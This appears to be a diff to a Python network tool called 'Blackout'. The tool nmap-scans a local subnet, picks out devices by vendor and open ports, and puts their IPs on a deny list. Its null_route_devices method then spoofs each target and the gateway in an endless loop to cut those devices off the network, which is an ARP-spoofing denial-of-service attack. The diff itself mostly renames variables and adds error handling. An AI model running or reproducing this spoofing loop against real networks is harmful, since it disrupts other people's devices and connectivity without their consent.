@@ -20,7 +20,8 @@ class Blackout:
         self.macdb = {}
         self.ports = self.get_ports()
         self.nm = nmap.PortScanner()
-        self.deny_devices = []
+        self.deny_ips = []
+        self.all_ips = []
         self.hosts = '192.168.1.0/24'
         self.devices = []
 
@@ -42,6 +43,7 @@ class Blackout:
 
     def detect_devices(self):
         for ip in self.devices['scan']:
+            self.all_ips.append(ip)
             logger.info(f'Checking {ip}')
             print(f'Checking {ip}')
             device = self.devices['scan'][ip]
@@ -60,17 +62,21 @@ class Blackout:
             scanning = True
             while scanning:
                 try:
-                    services_raw = self.nm.scan(ip, ports=self.ports)
-                    services = services_raw['scan'][ip]['tcp']
+                    if self.ports != '':
+                        services_raw = self.nm.scan(ip, ports=self.ports)
+                        services = services_raw['scan'][ip]['tcp']
+                    else:
+                        services = []
                     logger.info(f'Scan complete')
                     scanning = False
-                except:
+                except Exception as e:
+                    print(e)
                     logger.error('Error, retrying scan')
 
             for device_check in self.mode['devices']:
                 if self.mode['devices'][device_check].match(vendor, services):
                     logger.info(f'Device matched! Adding to blacklist.')
-                    self.deny_devices.append(
+                    self.deny_ips.append(
                         ip
                     )
                     break
@@ -107,20 +113,20 @@ class Blackout:
     def null_route_devices(self):
         gateway = '192.168.1.1'
         print(f'Null routing the following devices:')
-        for item in self.deny_devices:
+        for item in self.deny_ips:
             print(item)
         print('\n\n')
         try:
             pkts = 0
             logger.info('Null Routing')
             while True:
-                for target in self.deny_devices:
+                for target in self.deny_ips:
                     self.spoof(target, gateway)
                     self.spoof(gateway, target)
                     pkts+=1
                     print("\r[*] Packets Sent " + str(pkts), end="")
                 time.sleep(0.1)
         except KeyboardInterrupt:
-            for target in self.deny_devices:
+            for target in self.deny_ips:
                 self.restore(gateway, target)
                 self.restore(target, gateway)
